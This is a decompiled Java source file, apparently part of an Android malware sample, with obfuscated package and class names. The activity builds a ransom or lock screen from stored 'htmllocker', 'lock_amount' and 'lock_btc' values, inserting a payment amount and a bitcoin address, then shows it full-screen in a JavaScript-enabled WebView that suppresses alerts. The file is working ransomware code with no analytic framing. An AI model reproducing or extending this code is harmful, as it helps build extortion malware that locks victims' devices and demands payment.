package wocwvy.czyxoxmbauu.slsa.ncec;

import android.app.Activity;
import android.os.Bundle;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import wocwvy.czyxoxmbauu.slsa.C0034b;

public class kcdbt extends Activity {

    /* renamed from: a */
    C0034b f449a = new C0034b();

    /* renamed from: wocwvy.czyxoxmbauu.slsa.ncec.kcdbt$a */
    private class C0049a extends WebChromeClient {
        private C0049a() {
        }

        public boolean onJsAlert(WebView webView, String str, String str2, JsResult jsResult) {
            return true;
        }
    }

    /* renamed from: wocwvy.czyxoxmbauu.slsa.ncec.kcdbt$b */
    private class C0050b extends WebViewClient {
        private C0050b() {
        }

        public void onPageFinished(WebView webView, String str) {
        }

        public boolean shouldOverrideUrlLoading(WebView webView, String str) {
            return false;
        }
    }

    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        String e = this.f449a.mo234e(this, "htmllocker");
        String e2 = this.f449a.mo234e(this, "lock_amount");
        String replace = e.replace("<amount>", e2).replace("<bitcoin>", this.f449a.mo234e(this, "lock_btc"));
        WebView webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setScrollBarStyle(0);
        webView.setWebViewClient(new C0050b());
        webView.setWebChromeClient(new C0049a());
        webView.loadData(replace, "text/html", "UTF-8");
        setContentView(webView);
    }
}
